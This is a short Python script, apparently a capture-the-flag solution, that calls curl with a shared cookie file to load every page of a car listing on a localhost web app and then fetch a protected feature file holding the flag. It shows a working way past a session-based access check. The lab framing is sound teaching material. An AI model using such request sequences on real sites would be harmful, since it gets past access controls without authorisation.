import subprocess

cookie_file = "session.txt"

BASE = "http://localhost:3000"

#fetch all car pages (assuming we don't know the number, keep going until empty)
page = 0
while True:
    url = f"{BASE}/static/cars.json?page={page}"
    print(f"[+] Fetching page {page}...")
    result = subprocess.run(
        ["curl", "-s", "-c", cookie_file, "-b", cookie_file, url],
        capture_output=True,
        text=True
    )
    data = result.stdout.strip()
    if data.__contains__("done"):
        print("[+] All car pages loaded.")
        break
    page += 1

#fetch the flag
print("[+] Fetching the flag...")
flag_result = subprocess.run(
    ["curl", "-s", "-c", cookie_file, "-b", cookie_file, f"{BASE}/features/feature.json"],
    capture_output=True,
    text=True
)

print("\nFlag:")
print(flag_result.stdout.strip())
